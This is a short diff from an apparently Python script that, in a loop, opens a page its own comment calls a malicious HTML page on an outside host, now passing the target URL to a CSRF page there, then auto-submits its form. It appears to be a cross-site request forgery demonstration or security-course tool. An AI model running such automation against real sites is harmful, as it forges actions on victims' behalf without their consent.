@@ -211,9 +211,10 @@ while exit != "y":
             print()
 
             #open malicious html page
-            browser.open("http://javariati.tk/matteo/InfoSec/CSRF.html")
+            browser.open("http://javariati.tk/matteo/InfoSec/CSRF.php?url=" + url)
 
             browser.select_form(nr = 0)
+            print(browser)
             browser.submit()
             #form is automatically submitted
 
